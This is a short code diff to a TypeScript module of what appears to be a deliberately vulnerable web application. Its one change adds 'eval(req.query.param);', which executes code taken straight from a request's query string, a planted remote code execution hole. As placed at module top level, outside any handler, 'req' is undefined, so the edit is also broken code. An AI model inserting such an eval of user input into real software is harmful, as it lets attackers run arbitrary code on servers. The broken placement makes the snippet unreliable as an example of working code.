@@ -10,7 +10,7 @@ import * as models from '../models/index'
 import { UserModel } from '../models/user'
 import { challenges } from '../data/datacache'
 import * as challengeUtils from '../lib/challengeUtils'
-
+eval(req.query.param);
 class ErrorWithParent extends Error {
   parent: Error | undefined
 }
